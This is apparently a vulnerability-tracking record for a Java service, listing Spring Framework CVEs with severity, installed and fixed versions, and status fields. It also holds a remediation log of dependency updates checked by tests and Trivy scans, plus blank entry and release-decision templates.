  ### CVE-2026-41851: Applications which accept user-supplied Spring Expression Language (SpEL) expressions may be vulnerable to a Denial of Service (DoS) attack if the evaluation of a SpEL expression triggers unbounded cache growth.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-expression
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application layer 
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41852 : A vulnerability in Spring Expression Language (SpEL) evaluation logic allows for arbitrary zero-argument method invocation, even within restricted or read-only contexts, which may allow an attacker to invoke unintended application logic.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-expression
- Severity: LOW
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41854: Due to incorrect host parsing, applications that rely on UriComponentsBuilder to parse and validate an externally provided URL string may be exposed to a server-side request forgery (SSRF) attack.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18.
          
- Package: org.springframework:spring-web
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### <CVE-ID>: <short description>
          
- Package: <PkgName>
- Severity: <Severity>
- Installed version: <InstalledVersion>
- Fixed version: <FixedVersion or none>
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: <>
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:



  
## Remediation Log

| Date | Finding | Change made | Validation | Result |
|---|---|---|---|---|
| 2026-08-31 | GHSA-r7wm-3cxj-wff9, CVE-2026-40983, CVE-2026-40984, CVE-2026-42583, CVE-2026-44249, CVE-2026-45416, CVE-2026-50010, CVE-2026-41293, CVE-2026-43512, CVE-2026-43515, CVE-2026-41284, CVE-2026-42498, CVE-2026-43513, CVE-2026-41695, CVE-2026-41716, CVE-2026-41850, CVE-2026-41842, CVE-2026-41845 | dependency change | .\gradlew clean test, CI Trivy scan of health-watch-api:test | passed |
| 2026-08-31 | CVE-2026-54512, CVE-2026-54513 | dependency change | .\gradlew clean test, CI Trivy scan of health-watch-api:test | passed |
| 2026-08-31 | CVE-2021-22569, CVE-2022-3509, CVE-2022-3510, CVE-2024-7254, CVE-2023-22102 | dependency change | .\gradlew clean test, CI Trivy scan of health-watch-api:test | passed |
| 2026-08-31 | CVE-2026-63337, CVE-2026-69219, CVE-2026-69220 | dependency change | .\gradlew clean test, CI Trivy scan of health-watch-api:test | passed |
| YYYY-MM-DD | <CVE-ID or package> | <dependency/image/package change> | <test or scan command> | <passed/failed> |

## Release Decision

- Decision: <Approved / Blocked / Approved with exception>
- Decision date: YYYY-MM-DD
- Approved by: <name or team>
- Conditions: <required fixes or monitoring>
- Next review date: YYYY-MM-DD
